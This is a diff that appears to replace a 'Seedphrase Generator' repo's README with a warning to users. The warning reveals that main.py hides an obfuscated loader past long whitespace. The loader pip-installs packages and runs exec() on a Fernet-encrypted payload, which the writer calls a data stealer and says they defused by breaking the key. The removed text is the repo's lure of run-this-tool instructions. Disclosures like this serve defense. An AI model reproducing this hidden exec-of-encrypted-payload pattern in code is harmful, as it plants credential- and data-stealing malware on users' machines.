@@ -1,27 +1,7 @@
-# Seedphrase Generator              
-              
-## Fast & easy Python seedphrase generator                 
-                      
-# Guide on how to use these tool                      
-                     
-1. Install Python from                      
-          
-2. Download the repo as a ZIP                
-               
-3. Go in your file explorer and extract the ZIP file              
-                     
-4. Go in the extracted folder and open the start.bat file              
-                    
-5. Enjoy!                  
-                       
-## License                          
-             
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.                          
-         
-## Contributing           
-               
-Contributions are welcome! Please fork the repository and submit a pull request with your changes.                
-               
----               
-                     
-**Disclaimer**: This script is provided as-is, and the authors are not responsible for any misuse or unintended consequences. Always ensure you have permission before running such scripts.                    
+Open main.py
+At the bottom of the page you will find a scroll bar, go to the rightmost edge, you will see a line like this:
+;import os;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'IJY_o6Fa4dbWlKcLlSQ='). decrypt(b'gAAAAAABm3L5fpY-HbIAOc4yo0hde27lhlkXKiMuwYmLgJeD0Rt4YQnrjVcO1mZW4povXy_8iu3bcZEt9pkF6H8NTZNH6zRxMe7NDG-. 7Ttg6bWCY5qkD6sq1PTN3i9pQzTXtUdNokqxSAAZJe4wDp_qdh2sVSH8ICpkNx0r3OQFwZD4BDqBJRsPbNI_lXXXBXylhl2ThTVUj9KDIXx3dimDjqJH78Qmuz7w=='))
+
+This tells us that the creator is trying to steal your data, please be vigilant!!!!
+
+I broke the decryption key on purpose so that no one could accidentally run this data styler!
